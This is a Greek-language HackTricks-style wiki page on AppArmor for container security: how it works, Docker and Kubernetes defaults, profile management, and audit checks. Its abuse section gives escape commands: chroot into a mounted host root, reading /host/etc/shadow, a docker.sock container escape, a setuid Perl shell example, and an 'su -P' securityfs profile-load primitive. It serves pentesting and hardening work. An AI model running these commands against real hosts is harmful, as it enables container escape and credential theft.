# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Το AppArmor είναι ένα σύστημα **Mandatory Access Control** που επιβάλλει περιορισμούς μέσω profiles ανά πρόγραμμα. Σε αντίθεση με τους παραδοσιακούς ελέγχους DAC, οι οποίοι εξαρτώνται σε μεγάλο βαθμό από την ιδιοκτησία χρηστών και ομάδων, το AppArmor επιτρέπει στον kernel να επιβάλλει μια πολιτική συνδεδεμένη με την ίδια τη διεργασία. Σε περιβάλλοντα containers, αυτό έχει σημασία, επειδή ένα workload μπορεί να έχει αρκετά προνόμια ώστε να επιχειρήσει μια ενέργεια και, παρ' όλα αυτά, να απορριφθεί, επειδή το AppArmor profile του δεν επιτρέπει τη σχετική διαδρομή, τη συμπεριφορά mount ή δικτύου ή τη χρήση capability.

Το σημαντικότερο εννοιολογικό σημείο είναι ότι το AppArmor βασίζεται σε **διαδρομές**. Διαχειρίζεται την πρόσβαση στο σύστημα αρχείων μέσω κανόνων διαδρομών και όχι μέσω labels, όπως κάνει το SELinux. Αυτό το καθιστά προσιτό και ισχυρό, αλλά σημαίνει επίσης ότι τα bind mounts και οι εναλλακτικές διατάξεις διαδρομών απαιτούν ιδιαίτερη προσοχή. Αν το ίδιο περιεχόμενο του host γίνει προσβάσιμο μέσω διαφορετικής διαδρομής, η επίδραση της πολιτικής μπορεί να μην είναι αυτή που αρχικά περίμενε ο χειριστής.

## Ρόλος στην απομόνωση των containers

Οι αξιολογήσεις ασφάλειας των containers συχνά περιορίζονται στα capabilities και το seccomp, αλλά το AppArmor εξακολουθεί να έχει σημασία και μετά από αυτούς τους ελέγχους. Φανταστείτε ένα container με περισσότερα προνόμια από όσα θα έπρεπε να έχει ή ένα workload που χρειάστηκε ένα επιπλέον capability για λειτουργικούς λόγους. Το AppArmor μπορεί και πάλι να περιορίσει την πρόσβαση σε αρχεία, τη συμπεριφορά mount, τη δικτύωση και τα μοτίβα εκτέλεσης, αποτρέποντας προφανείς διαδρομές κατάχρησης. Γι' αυτό η απενεργοποίηση του AppArmor «απλώς για να λειτουργήσει η εφαρμογή» μπορεί αθόρυβα να μετατρέψει μια απλώς επικίνδυνη ρύθμιση σε μια ρύθμιση που είναι ενεργά εκμεταλλεύσιμη.

## Εργαστήριο

Για να ελέγξετε αν το AppArmor είναι ενεργό στον host, χρησιμοποιήστε:

```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```

Για να δείτε υπό ποιον χρήστη εκτελείται η τρέχουσα διεργασία του container:

```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```

Η διαφορά είναι διδακτική. Στη συνηθισμένη περίπτωση, η διεργασία θα πρέπει να εμφανίζει ένα πλαίσιο AppArmor συνδεδεμένο με το προφίλ που επέλεξε το runtime. Στην περίπτωση χωρίς περιορισμούς, αυτό το πρόσθετο επίπεδο περιορισμών εξαφανίζεται.

Μπορείτε επίσης να ελέγξετε τι θεωρεί το Docker ότι εφαρμόστηκε:

```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```

## Χρήση κατά τον χρόνο εκτέλεσης

Το Docker μπορεί να εφαρμόσει ένα προεπιλεγμένο ή προσαρμοσμένο προφίλ AppArmor όταν το υποστηρίζει ο host. Το Podman μπορεί επίσης να ενσωματωθεί με το AppArmor σε συστήματα που βασίζονται στο AppArmor, αν και στις διανομές που δίνουν προτεραιότητα στο SELinux συχνά πρωταγωνιστεί το άλλο σύστημα MAC. Το Kubernetes μπορεί να εκθέσει πολιτική AppArmor στο επίπεδο του workload, σε κόμβους που υποστηρίζουν πράγματι το AppArmor. Τα LXC και τα σχετικά περιβάλλοντα system container της οικογένειας Ubuntu χρησιμοποιούν επίσης εκτενώς το AppArmor.

Το πρακτικό συμπέρασμα είναι ότι το AppArmor δεν είναι «λειτουργία του Docker». Είναι λειτουργία του πυρήνα του host, την οποία διάφορα runtimes μπορούν να επιλέξουν να εφαρμόσουν. Αν ο host δεν το υποστηρίζει ή αν έχει δοθεί εντολή στο runtime να εκτελεστεί χωρίς περιορισμούς, η υποτιθέμενη προστασία ουσιαστικά δεν υπάρχει.

Ειδικά για το Kubernetes, το σύγχρονο API είναι το `securityContext.appArmorProfile`. Από το Kubernetes `v1.30`, οι παλαιότερες beta σημειώσεις AppArmor είναι παρωχημένες. Σε υποστηριζόμενους hosts, το `RuntimeDefault` είναι το προεπιλεγμένο προφίλ, ενώ το `Localhost` παραπέμπει σε προφίλ που πρέπει να είναι ήδη φορτωμένο στον κόμβο. Αυτό έχει σημασία κατά τον έλεγχο, επειδή ένα manifest μπορεί να φαίνεται ότι λαμβάνει υπόψη το AppArmor, ενώ στην πράξη να εξαρτάται πλήρως από την υποστήριξη του κόμβου και τα προφορτωμένα προφίλ.<sup>[[1]](#references)</sup>

Μια λεπτομέρεια λειτουργίας που δεν είναι προφανής, αλλά είναι χρήσιμη, είναι ότι ο ρητός ορισμός του `appArmorProfile.type: RuntimeDefault` είναι αυστηρότερος από την απλή παράλειψη του πεδίου. Αν το πεδίο οριστεί ρητά και ο κόμβος δεν υποστηρίζει AppArmor, η αποδοχή θα πρέπει να αποτύχει. Αν το πεδίο παραλειφθεί, το workload μπορεί και πάλι να εκτελεστεί σε κόμβο χωρίς AppArmor, απλώς χωρίς αυτό το επιπλέον επίπεδο περιορισμού. Από την οπτική ενός attacker, αυτός είναι ένας καλός λόγος να ελέγχει τόσο το manifest όσο και την πραγματική κατάσταση του κόμβου.<sup>[[1]](#references)</sup>

Σε hosts με AppArmor που υποστηρίζουν Docker, το πιο γνωστό προεπιλεγμένο προφίλ είναι το `docker-default`. Αυτό το προφίλ δημιουργείται από το πρότυπο AppArmor του Moby και είναι σημαντικό, επειδή εξηγεί γιατί ορισμένα PoC που βασίζονται σε capabilities εξακολουθούν να αποτυγχάνουν σε ένα προεπιλεγμένο container. Σε γενικές γραμμές, το `docker-default` επιτρέπει τη συνηθισμένη δικτύωση, απαγορεύει τις εγγραφές σε μεγάλο μέρος του `/proc`, αρνείται την πρόσβαση σε ευαίσθητα τμήματα του `/sys`, αποκλείει τις λειτουργίες mount και περιορίζει το ptrace, ώστε να μην αποτελεί γενικό μηχανισμό διερεύνησης του host. Η κατανόηση αυτής της βασικής διαμόρφωσης βοηθά να ξεχωρίσουμε το «το container έχει `CAP_SYS_ADMIN`» από το «το container μπορεί πράγματι να χρησιμοποιήσει αυτήν την capability απέναντι στις διεπαφές του πυρήνα που με ενδιαφέρουν».

## Διαχείριση προφίλ

Τα προφίλ AppArmor αποθηκεύονται συνήθως στο `/etc/apparmor.d/`. Μια συνηθισμένη σύμβαση ονοματοδοσίας είναι η αντικατάσταση των καθέτων στη διαδρομή του εκτελέσιμου αρχείου με τελείες. Για παράδειγμα, ένα προφίλ για το `/usr/bin/man` αποθηκεύεται συνήθως ως `/etc/apparmor.d/usr.bin.man`. Αυτή η λεπτομέρεια έχει σημασία τόσο για την άμυνα όσο και για την αξιολόγηση, επειδή μόλις μάθετε το όνομα του ενεργού προφίλ, μπορείτε συχνά να εντοπίσετε γρήγορα το αντίστοιχο αρχείο στον host.

Χρήσιμες εντολές διαχείρισης στην πλευρά του host περιλαμβάνουν:

```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```

Ο λόγος που αυτές οι εντολές έχουν σημασία σε μια αναφορά για την ασφάλεια των container είναι ότι εξηγούν πώς δημιουργούνται και φορτώνονται στην πράξη τα προφίλ, πώς αλλάζουν σε complain mode και πώς τροποποιούνται μετά από αλλαγές στην εφαρμογή. Αν ένας διαχειριστής συνηθίζει να θέτει τα προφίλ σε complain mode κατά την αντιμετώπιση προβλημάτων και ξεχνά να επαναφέρει την επιβολή περιορισμών, το container μπορεί να φαίνεται προστατευμένο στην τεκμηρίωση, ενώ στην πραγματικότητα λειτουργεί με πολύ χαλαρότερους περιορισμούς.

### Δημιουργία και ενημέρωση προφίλ

Το `aa-genprof` μπορεί να παρακολουθεί τη συμπεριφορά μιας εφαρμογής και να βοηθά στη διαδραστική δημιουργία προφίλ:

```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```

Το `aa-easyprof` μπορεί να δημιουργήσει ένα πρότυπο προφίλ, το οποίο μπορεί αργότερα να φορτωθεί με το `apparmor_parser`:

```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```

Όταν αλλάζει το binary και χρειάζεται ενημέρωση της πολιτικής, το `aa-logprof` μπορεί να επανεξετάσει τις αρνήσεις που εντοπίζονται στα logs και να βοηθήσει τον χειριστή να αποφασίσει αν θα τις επιτρέψει ή θα τις απορρίψει:

```bash
sudo aa-logprof
```

### Αρχεία καταγραφής

Οι αρνήσεις του AppArmor είναι συχνά ορατές μέσω των `auditd`, syslog ή εργαλείων όπως το `aa-notify`:

```bash
sudo aa-notify -s 1 -v
```

Αυτό είναι χρήσιμο επιχειρησιακά και για επιθετικές ενέργειες. Οι defenders το χρησιμοποιούν για να βελτιώσουν τα profiles. Οι attackers το χρησιμοποιούν για να μάθουν ποια ακριβώς διαδρομή ή λειτουργία απορρίπτεται και αν το AppArmor είναι ο μηχανισμός ελέγχου που εμποδίζει μια αλυσίδα exploit.

### Εντοπισμός του ακριβούς αρχείου Profile

Όταν ένα runtime εμφανίζει ένα συγκεκριμένο όνομα profile AppArmor για ένα container, είναι συχνά χρήσιμο να αντιστοιχίσετε αυτό το όνομα με το αρχείο profile στον δίσκο:

```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```

Αυτό είναι ιδιαίτερα χρήσιμο κατά τον έλεγχο από την πλευρά του host, επειδή γεφυρώνει το χάσμα ανάμεσα στο «το container δηλώνει ότι εκτελείται με το profile `lowpriv`» και στο «οι πραγματικοί κανόνες βρίσκονται σε αυτό το συγκεκριμένο αρχείο, το οποίο μπορεί να ελεγχθεί ή να φορτωθεί ξανά».

### Κανόνες υψηλής προτεραιότητας για έλεγχο

Όταν μπορείτε να διαβάσετε ένα profile, μην περιορίζεστε σε απλές γραμμές `deny`. Αρκετοί τύποι κανόνων επηρεάζουν ουσιαστικά το πόσο αποτελεσματικό θα είναι το AppArmor απέναντι σε μια απόπειρα διαφυγής από container:<sup>[[2]](#references)</sup>

- `ux` / `Ux`: εκτέλεση του δυαδικού αρχείου-στόχου χωρίς περιορισμούς. Αν επιτρέπεται η εκτέλεση κάποιου προσβάσιμου βοηθητικού προγράμματος, shell ή interpreter με `ux`, αυτό είναι συνήθως το πρώτο που πρέπει να δοκιμάσετε.
- `px` / `Px` και `cx` / `Cx`: εκτέλεση μετάβασης profile κατά το exec. Αυτά δεν είναι αυτομάτως προβληματικά, αλλά αξίζει να ελεγχθούν, επειδή η μετάβαση μπορεί να οδηγήσει σε ένα πολύ ευρύτερο profile από το τρέχον.
- `change_profile`: επιτρέπει σε μια εργασία να μεταβεί σε άλλο φορτωμένο profile, αμέσως ή κατά το επόμενο exec. Αν το profile προορισμού είναι ασθενέστερο, αυτό μπορεί να αποτελέσει την προβλεπόμενη οδό διαφυγής από έναν περιοριστικό τομέα.
- `flags=(complain)`, `flags=(unconfined)` ή το νεότερο `flags=(prompt)`: αυτά πρέπει να επηρεάζουν το πόση εμπιστοσύνη δείχνετε στο profile. Το `complain` καταγράφει τις αρνήσεις αντί να τις επιβάλλει, το `unconfined` καταργεί το όριο ασφαλείας και το `prompt` εξαρτάται από μια διαδρομή απόφασης σε userspace αντί για άρνηση που επιβάλλεται αποκλειστικά από τον kernel.
- `userns` ή `userns create,`: οι νεότερες πολιτικές AppArmor μπορούν να ελέγχουν τη δημιουργία user namespaces. Αν ένα profile container το επιτρέπει ρητά, τα ένθετα user namespaces παραμένουν διαθέσιμα, ακόμη κι όταν η πλατφόρμα χρησιμοποιεί το AppArmor ως μέρος της στρατηγικής σκλήρυνσής της.

Χρήσιμη εντολή grep από την πλευρά του host:

```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Αυτός ο τύπος ελέγχου είναι συχνά πιο χρήσιμος από το να εξετάζετε εκατοντάδες συνηθισμένους κανόνες αρχείων. Αν ένα breakout εξαρτάται από την εκτέλεση ενός βοηθητικού προγράμματος, την είσοδο σε ένα νέο namespace ή τη μετάβαση σε ένα λιγότερο περιοριστικό profile, η απάντηση συχνά κρύβεται σε αυτούς τους κανόνες που αφορούν τις μεταβάσεις και όχι στις προφανείς γραμμές τύπου `deny /etc/shadow r`.

## Εσφαλμένες ρυθμίσεις

Το πιο προφανές λάθος είναι το `apparmor=unconfined`. Οι διαχειριστές συχνά το ορίζουν όταν κάνουν debugging σε μια εφαρμογή που απέτυχε επειδή το profile απέκλεισε σωστά κάτι επικίνδυνο ή απρόσμενο. Αν η σημαία παραμείνει σε production, ολόκληρο το επίπεδο MAC έχει ουσιαστικά καταργηθεί.

Ένα ακόμη πιο διακριτικό πρόβλημα είναι η υπόθεση ότι τα bind mounts είναι ακίνδυνα επειδή τα δικαιώματα των αρχείων φαίνονται φυσιολογικά. Επειδή το AppArmor βασίζεται σε διαδρομές, η έκθεση διαδρομών του host σε εναλλακτικές τοποθεσίες mount μπορεί να αλληλεπιδράσει αρνητικά με τους κανόνες διαδρομών. Ένα τρίτο λάθος είναι να ξεχνάμε ότι ένα όνομα profile σε ένα αρχείο ρυθμίσεων σημαίνει ελάχιστα, αν ο πυρήνας του host δεν επιβάλλει πραγματικά το AppArmor.

## Κατάχρηση

Όταν το AppArmor απουσιάζει, λειτουργίες που προηγουμένως περιορίζονταν μπορεί ξαφνικά να εκτελούνται: ανάγνωση ευαίσθητων διαδρομών μέσω bind mounts, πρόσβαση σε τμήματα των procfs ή sysfs που θα έπρεπε να είναι δυσκολότερο να χρησιμοποιηθούν, εκτέλεση ενεργειών σχετικών με το mount αν το επιτρέπουν επίσης τα capabilities/seccomp ή χρήση διαδρομών που κανονικά θα απαγόρευε ένα profile. Το AppArmor είναι συχνά ο μηχανισμός που εξηγεί γιατί μια προσπάθεια breakout βασισμένη σε capabilities «θα έπρεπε να λειτουργεί» θεωρητικά, αλλά εξακολουθεί να αποτυγχάνει στην πράξη. Αφαιρέστε το AppArmor και η ίδια προσπάθεια μπορεί να αρχίσει να πετυχαίνει.

Αν υποψιάζεστε ότι το AppArmor είναι το κύριο εμπόδιο σε μια αλυσίδα κατάχρησης μέσω path-traversal, bind mount ή mount, το πρώτο βήμα είναι συνήθως να συγκρίνετε τι γίνεται προσβάσιμο με και χωρίς profile. Για παράδειγμα, αν μια διαδρομή του host είναι προσαρτημένη μέσα στο container, ξεκινήστε ελέγχοντας αν μπορείτε να περιηγηθείτε σε αυτήν και να διαβάσετε τα περιεχόμενά της:

```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```

Αν το container διαθέτει επίσης μια επικίνδυνη δυνατότητα, όπως `CAP_SYS_ADMIN`, ένας από τους πιο πρακτικούς ελέγχους είναι να διαπιστώσετε αν το AppArmor είναι ο μηχανισμός ελέγχου που εμποδίζει τις λειτουργίες προσάρτησης ή την πρόσβαση σε ευαίσθητα συστήματα αρχείων του kernel:

```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```

Σε περιβάλλοντα όπου μια διαδρομή του host είναι ήδη διαθέσιμη μέσω bind mount, η απώλεια του AppArmor μπορεί επίσης να μετατρέψει ένα ζήτημα αποκάλυψης πληροφοριών μόνο για ανάγνωση σε άμεση πρόσβαση σε αρχεία του host:

```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```

Ο σκοπός αυτών των εντολών δεν είναι ότι το AppArmor από μόνο του προκαλεί το breakout. Είναι ότι μόλις αφαιρεθεί το AppArmor, πολλές διαδρομές κατάχρησης που βασίζονται στο σύστημα αρχείων και στα mounts μπορούν να δοκιμαστούν αμέσως.

### Πλήρες παράδειγμα: Απενεργοποιημένο AppArmor + Προσαρτημένο root του host

Αν το root του host είναι ήδη προσαρτημένο με bind στο `/host`, η αφαίρεση του AppArmor μπορεί να μετατρέψει μια αποκλεισμένη διαδρομή κατάχρησης του συστήματος αρχείων σε πλήρη διαφυγή από το host:

```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```

Μόλις το shell εκτελείται μέσω του filesystem του host, το workload έχει ουσιαστικά διαφύγει από τα όρια του container:

```bash
id
hostname
cat /etc/shadow | head
```

### Πλήρες Παράδειγμα: AppArmor Απενεργοποιημένο + Runtime Socket

Αν το πραγματικό εμπόδιο ήταν το AppArmor που προστάτευε το runtime state, ένα προσαρτημένο socket μπορεί να αρκεί για πλήρες escape:

```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```

Η ακριβής διαδρομή εξαρτάται από το σημείο προσάρτησης, αλλά το τελικό αποτέλεσμα είναι το ίδιο: το AppArmor δεν εμποδίζει πλέον την πρόσβαση στο runtime API, και το runtime API μπορεί να εκκινήσει ένα container που θέτει σε κίνδυνο τον host.

### Πλήρες παράδειγμα: Παράκαμψη bind-mount βάσει διαδρομής

Επειδή το AppArmor βασίζεται σε διαδρομές, η προστασία του `/proc/**` δεν προστατεύει αυτόματα το ίδιο περιεχόμενο του procfs του host όταν είναι προσβάσιμο μέσω διαφορετικής διαδρομής:

```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```

Ο αντίκτυπος εξαρτάται από το τι ακριβώς είναι προσαρτημένο και από το αν η εναλλακτική διαδρομή παρακάμπτει επίσης άλλους ελέγχους, αλλά αυτό το μοτίβο είναι ένας από τους σαφέστερους λόγους για τους οποίους το AppArmor πρέπει να αξιολογείται σε συνδυασμό με τη διάταξη των mount και όχι μεμονωμένα.

### Πλήρες παράδειγμα: Παράκαμψη Shebang

Το AppArmor μπορεί να συνδέσει ένα profile με τη διαδρομή του εκτελούμενου script και όχι με τον interpreter που αναφέρεται στο shebang του. Αντίστροφα, η απευθείας κλήση του interpreter μπορεί να επιλέξει το profile του. Ένας [συντηρητής του AppArmor περιγράφει αυτή τη διάκριση](https://bugs.launchpad.net/apparmor/+bug/1911431). Ένα ιστορικό παράδειγμα αφορούσε ένα script του οποίου η πρώτη γραμμή δείχνει σε έναν περιορισμένο interpreter:

```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```

Το παράδειγμα είναι μόνο μια περίπτωση όπου η δυνατότητα αρχείου του interpreter μπορεί να γίνει ενεργή και το πραγματικό exec attachment του script επιτρέπει τη λειτουργία. Ελέγξτε την φορτωμένη policy και το process label, το capability bounding set, το `no_new_privs` και την κατάσταση `nosuid` του mount· το όνομα ενός αρχείου προφίλ ή μια καταχώριση `cap_setuid+ep` από μόνα τους δεν αποδεικνύουν ότι είναι εφικτή μια αξιοποιήσιμη μετάβαση. Οι αλυσίδες interpreter και οι εναλλακτικές διαδρομές εκτέλεσης χρειάζονται ξεχωριστό έλεγχο.

## Αρχεία ελέγχου policy ως προνομιούχο primitive εγγραφής

Σε πυρήνες AppArmor που επηρεάζονται, ένας μη προνομιούχος χρήστης μπορεί να ανοίξει για εγγραφή το αρχείο `.load`, `.replace` ή `.remove` του securityfs, αλλά ένα άμεσο `write()` αποτυγχάνει, επειδή η άδεια διαχείρισης policy ελέγχεται κατά την εγγραφή. Αν ένα setuid helper κληρονομήσει αυτόν τον file descriptor ως stdout ή stderr και γράψει bytes που ελέγχει ο επιτιθέμενος, ο πυρήνας χρησιμοποιεί τα διαπιστευτήρια του helper. Αυτό καθιστά το helper *προνομιούχο writer* δεδομένων policy, όχι έναν γενικό τρόπο παροχής root στον καλούντα. Η Qualys έδειξε ότι το `su -P` μπορεί να προωθήσει bytes από μια εντολή που εκτελείται ως ο ίδιος χρήστης μέσω της προνομιούχας διαδρομής PTY· αυτή η διαδρομή απαιτεί να έχει οριστεί κωδικός πρόσβασης για τον λογαριασμό του χρήστη. Ελέγξτε τις διορθώσεις για τον εγκατεστημένο πυρήνα και το `su`, αντί να θεωρείτε ότι η άδεια εγγραφής από όλους αποδεικνύει έκθεση.<sup>[[3]](#references)[[4]](#references)</sup>

Σε ένα προσωρινό lab με επηρεαζόμενο πυρήνα και helper, αυτό δημιουργεί και στη συνέχεια αφαιρεί ένα δοκιμαστικό προφίλ. Το shell ανοίγει κάθε αρχείο ελέγχου πριν το `su` γράψει σε αυτό· το `stty raw` εμποδίζει την προώθηση PTY να τροποποιήσει τα bytes του μεταγλωττισμένου προφίλ. Μην εκτελέσετε τη δοκιμή σε προφίλ παραγωγής.<sup>[[3]](#references)</sup>

```bash
printf '/usr/bin/true {\n}\n' > /tmp/ht-aa-probe
apparmor_parser -K -o /tmp/ht-aa-probe.pf /tmp/ht-aa-probe
su -P -c 'stty raw && cat /tmp/ht-aa-probe.pf' "$USER" > /sys/kernel/security/apparmor/.load
grep '/usr/bin/true ' /sys/kernel/security/apparmor/profiles
su -P -c 'stty raw && printf %s /usr/bin/true' "$USER" > /sys/kernel/security/apparmor/.remove
```

Η ίδια primitive μπορεί να αντικαταστήσει ένα υπάρχον profile. Για παράδειγμα, ένα profile που επιτρέπει το `userns` για έναν launcher μπορεί να αφαιρέσει έναν περιορισμό του AppArmor για τα user namespaces, αλλά δεν εκχωρεί δυνατότητες host-root· εξακολουθούν να έχουν σημασία τα πραγματικά namespace sysctls και οι άλλοι έλεγχοι. Μπορεί επίσης να αφαιρέσει τον περιορισμό από μια διεργασία-στόχο. Εξετάστε τους [ελέγχους έκθεσης του kernel](../../../main-system-information/kernel-vulnerability-assessment.md) και την [επισκόπηση του Linux Hardening](../../../) για την ευρύτερη ροή εργασιών κλιμάκωσης προνομίων.<sup>[[3]](#references)[[4]](#references)</sup>

## Έλεγχοι

Στόχος αυτών των ελέγχων είναι να απαντήσουν γρήγορα σε τρία ερωτήματα: είναι ενεργοποιημένο το AppArmor στον host, υπόκειται περιορισμούς η τρέχουσα διεργασία και εφάρμοσε πράγματι το runtime ένα profile σε αυτό το container;

```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```

Τι είναι ενδιαφέρον εδώ:

- Αν το `/proc/self/attr/current` εμφανίζει `unconfined`, ο φόρτος εργασίας δεν επωφελείται από τον περιορισμό του AppArmor.
- Αν το `aa-status` εμφανίζει ότι το AppArmor είναι απενεργοποιημένο ή δεν έχει φορτωθεί, οποιοδήποτε όνομα profile υπάρχει στη ρύθμιση του runtime είναι κυρίως διακοσμητικό.
- Αν το `docker inspect` εμφανίζει `unconfined` ή κάποιο μη αναμενόμενο custom profile, αυτός είναι συχνά ο λόγος που λειτουργεί μια διαδρομή κατάχρησης που βασίζεται στο filesystem ή σε mounts.
- Αν το `/sys/kernel/security/apparmor/profiles` δεν περιέχει το profile που περιμένατε, η ρύθμιση του runtime ή του orchestrator δεν αρκεί από μόνη της.
- Αν ένα profile που υποτίθεται ότι είναι ενισχυμένο περιέχει κανόνες τύπου `ux`, ευρύ `change_profile`, `userns` ή `flags=(complain)`, το πρακτικό όριο ασφαλείας μπορεί να είναι πολύ ασθενέστερο απ' όσο υποδηλώνει το όνομα του profile.

Αν ένα container έχει ήδη αυξημένα προνόμια για λειτουργικούς λόγους, η διατήρηση του AppArmor ενεργοποιημένου συχνά κάνει τη διαφορά ανάμεσα σε μια ελεγχόμενη εξαίρεση και σε μια πολύ ευρύτερη αστοχία ασφάλειας.

## Προεπιλογές runtime

| Runtime / πλατφόρμα | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνήθεις χειροκίνητοι τρόποι αποδυνάμωσης |
| --- | --- | --- | --- |
| Docker Engine | Ενεργοποιημένο από προεπιλογή σε hosts που υποστηρίζουν AppArmor | Χρησιμοποιεί το profile AppArmor `docker-default`, εκτός αν παρακαμφθεί | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Εξαρτάται από το host | Το AppArmor υποστηρίζεται μέσω του `--security-opt`, αλλά η ακριβής προεπιλογή εξαρτάται από το host/runtime και είναι λιγότερο καθολική από το τεκμηριωμένο profile `docker-default` του Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Προεπιλογή υπό προϋποθέσεις | Αν δεν καθοριστεί το `appArmorProfile.type`, η προεπιλογή είναι `RuntimeDefault`, αλλά εφαρμόζεται μόνο όταν το AppArmor είναι ενεργοποιημένο στον κόμβο | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` με ασθενές profile, κόμβοι χωρίς υποστήριξη AppArmor |
| containerd / CRI-O υπό το Kubernetes | Εξαρτάται από την υποστήριξη του κόμβου/runtime | Τα συνήθη runtimes που υποστηρίζει το Kubernetes υποστηρίζουν το AppArmor, αλλά η πραγματική επιβολή εξακολουθεί να εξαρτάται από την υποστήριξη του κόμβου και τις ρυθμίσεις του workload | Όπως στην περίπτωση του Kubernetes· η απευθείας ρύθμιση του runtime μπορεί επίσης να παρακάμψει εντελώς το AppArmor |

Για το AppArmor, η σημαντικότερη μεταβλητή είναι συχνά το **host**, όχι μόνο το runtime. Μια ρύθμιση profile σε ένα manifest δεν επιβάλλει περιορισμό σε έναν κόμβο όπου το AppArmor δεν είναι ενεργοποιημένο.
